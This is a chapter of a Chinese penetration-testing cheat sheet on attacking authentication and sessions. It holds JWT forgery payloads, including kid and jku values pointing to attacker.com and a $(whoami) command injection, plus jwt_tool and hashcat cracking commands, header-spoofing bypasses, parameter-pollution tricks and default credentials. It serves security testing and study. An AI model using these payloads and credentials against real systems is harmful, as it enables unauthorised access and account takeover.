# 10 认证与会话

## JWT 攻击全家桶（按实战成功率排序）

1. **None 算法**（CVE-2015-9235）：header 改 `{"alg":"none"}` 删签名——5 秒测试，至今仍有效
2. **kid 注入**（真实目标中利用率最高）：

| 攻击 | Payload | 效果 |
|------|---------|------|
| 路径遍历 | `"kid": "../../dev/null"` | 读空文件当密钥 |
| 路径遍历 | `"kid": "/root/res/keys/secret.key"` | 读可预测服务器文件 |
| 远程包含 | `"kid": "http://attacker.com/privKey.key"` | 用攻击者密钥 |
| SQL 注入 | `"kid": "' UNION SELECT 'secret'--"` | 注入密钥查询 |
| 命令注入 | `"kid": "$(whoami)"` | OS 命令执行 |

3. **弱密钥爆破**：`jwt_tool -C -d wordlist.txt`；hashcat `-m 16500`；字典 wallarm/jwt-secrets（3502 个已知密钥）。常见弱密钥：`secret`、`your-256-bit-secret`、`changeme`
4. **密钥混淆 RS256→HS256**（CVE-2016-5431）：拿服务器 RSA 公钥当 HMAC 密钥签名——`openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout`，`jwt_tool -X k -pk my_public.pem`。Java/Python 实现常见
5. **嵌入 JWK**（CVE-2018-0114）：header 的 `jwk` 里放自己的公钥——`jwt_tool -X i` 或 Burp JWT Editor
6. **JKU 注入**：替换 `jku`（JWK Set URL）为攻击者 JWKS 端点——`jwt_tool -X s -ju http://attacker.com/jwks.json`
7. **Null 签名**（CVE-2020-28042）：HS256 但没有第三段
8. **签名泄露**（CVE-2019-7644）：故意损坏签名，读错误响应中的期望签名
9. JWT 声明篡改：改 `role/admin` 后不重签（服务端不验签时）

## Header 伪造绕过（403/认证类必试表）

| Header | 攻击 |
|--------|------|
| `X-Forwarded-For: 127.0.0.1` | 伪造内部 IP 绕过 IP 限制 |
| `X-Original-URL: /admin` | 覆盖请求路径（IIS/ASP.NET） |
| `X-Rewrite-URL: /admin` | 同上 |
| `X-Custom-IP-Authorization: 127.0.0.1` | 绕过 IP 认证 |
| `True-Client-IP: 127.0.0.1` | 伪造内部 IP |
| `User-Agent: GoogleBot` | 绕过爬虫认证 |
| `Referer: https://target.com/admin` | 绕过 Referer 检查 |

**遇到 403/405 就试所有 HTTP 方法**：`GET /admin` 被拦但 `POST/PUT/PATCH /admin` 可能放行。

## HTTP 参数污染（HPP）

- PHP/Apache 取**最后一个**值；Golang/JSP 取**第一个**
- 放良性值在前恶意值在后：`/transfer?amount=1&amount=5000`——WAF 看到 amount=1 放行，应用处理 5000
- 重复 role/user/isAdmin 参数测权限

## 会话缺陷

- 会话 ID 进 URL（可被 Referer 泄露）
- 登出后 token 不失效（可重放）
- **JWT 重放篡改**：改 payload 后旧签名仍有效（服务端只解不验）
- Cookie 属性：无 HttpOnly（XSS 可读）、无 Secure、SameSite=None
- 会话固定：登录前后 session 不轮换

## 弱口令与撞库

- 命中率最高组合：`admin:admin`、`admin:123456`、`test:test`、`test:123456`
- 远程管理卡默认口令：Dell `root:calvin`（HP/IBM/HUAWEI 各有默认表）
- js 里写死的账号密码（webpack 没删的测试账号）
- 验证码不刷新、抓包不变即可爆破
- 口令预测：口令含 IP/年份/公司缩写；口令复用（批量 SSH 同口令）；默认口令（huaweiadmin 类）
- 防守字典=现成攻击字典（见 18 章）

## 认证流全家桶 checklist（认证类 writeup 精华）

```
注册：覆盖他人账号？验证码绕过？批量注册？
登录：撞库/爆破？验证码回显/不刷新？固定码？错误信息区分"用户不存在/密码错误"？
找回：五板斧（见 09 章）逐项过
2FA：响应码绕过？暴力破解 OTP？竞态？记住设备逻辑缺陷？
会话：登出失效？并行会话？ fixation？
改绑：改邮箱/手机 CSRF/IDOR？
```
